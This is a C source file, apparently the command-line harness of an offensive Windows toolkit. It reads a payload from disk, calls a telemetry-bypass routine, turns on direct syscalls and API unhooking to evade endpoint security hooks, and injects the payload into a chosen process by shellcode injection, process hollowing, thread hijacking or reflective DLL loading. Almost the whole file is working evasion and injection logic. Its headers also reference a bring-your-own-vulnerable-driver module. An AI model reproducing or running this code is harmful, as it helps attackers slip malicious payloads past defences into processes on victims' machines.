#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include "injection.h"
#include "api_unhooking.h"
#include "byovd.h"
#include "pal.h"

#define LOG(...) do { fprintf(stderr, __VA_ARGS__); fflush(stderr); } while(0)

static unsigned char *read_file(const char *path, size_t *out_size) {
    FILE *f = fopen(path, "rb");
    if (!f) { LOG("[-] fopen failed: %s\n", path); return NULL; }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }
    unsigned char *buf = malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) { free(buf); fclose(f); return NULL; }
    fclose(f);
    *out_size = (size_t)sz;
    return buf;
}

static DWORD find_pid(const char *exe_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exe_name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main(int argc, char **argv) {
    if (argc < 4) { LOG("Usage: %s <method> <target> <payload>\n", argv[0]); return 1; }

    const char *method = argv[1];
    const char *target = argv[2];
    const char *payload_path = argv[3];

    LOG("[*] harness start: method=%s target=%s payload=%s\n", method, target, payload_path);

    size_t pl_size = 0;
    unsigned char *pl = read_file(payload_path, &pl_size);
    if (!pl) { LOG("[-] cannot read payload\n"); return 1; }
    LOG("[+] loaded %s (%zu bytes)\n", payload_path, pl_size);

    LOG("[*] bypass_telemetry()...\n");
    bypass_telemetry();
    LOG("[+] bypass_telemetry returned\n");

    LOG("[*] pal_set_use_direct_syscalls(1)...\n");
    pal_set_use_direct_syscalls(1);
    LOG("[+] direct syscalls set\n");

    InjectionConfig cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.payload = pl;
    cfg.payloadSize = pl_size;
    cfg.unhookApi = 1;
    cfg.useDirectSyscalls = 1;

    DWORD pid = 0;
    if (isdigit((unsigned char)target[0])) {
        pid = (DWORD)strtoul(target, NULL, 10);
    } else if (strcmp(method, "hollow") != 0) {
        pid = find_pid(target);
        if (!pid) { LOG("[-] process not found: %s\n", target); free(pl); return 1; }
    }

    if      (strcmp(method, "shellcode") == 0) { cfg.method = INJECT_METHOD_SHELLCODE;         cfg.targetPid = pid; }
    else if (strcmp(method, "hollow")    == 0) { cfg.method = INJECT_METHOD_PROCESS_HOLLOWING; cfg.targetImage = target; }
    else if (strcmp(method, "hijack")    == 0) { cfg.method = INJECT_METHOD_THREAD_HIJACKING;  cfg.targetPid = pid; }
    else if (strcmp(method, "reflect")   == 0) { cfg.method = INJECT_METHOD_REFLECTIVE_DLL;    cfg.targetPid = pid; }
    else { LOG("[-] unknown method: %s\n", method); free(pl); return 1; }

    LOG("[*] method = %s | target PID = %lu\n", method, (unsigned long)pid);
    LOG("[*] calling inject_process()...\n");

    int ret = inject_process(&cfg);
    LOG("[%s] inject_process returned %d\n", ret == 0 ? "+" : "-", ret);

    free(pl);
    return ret;
}
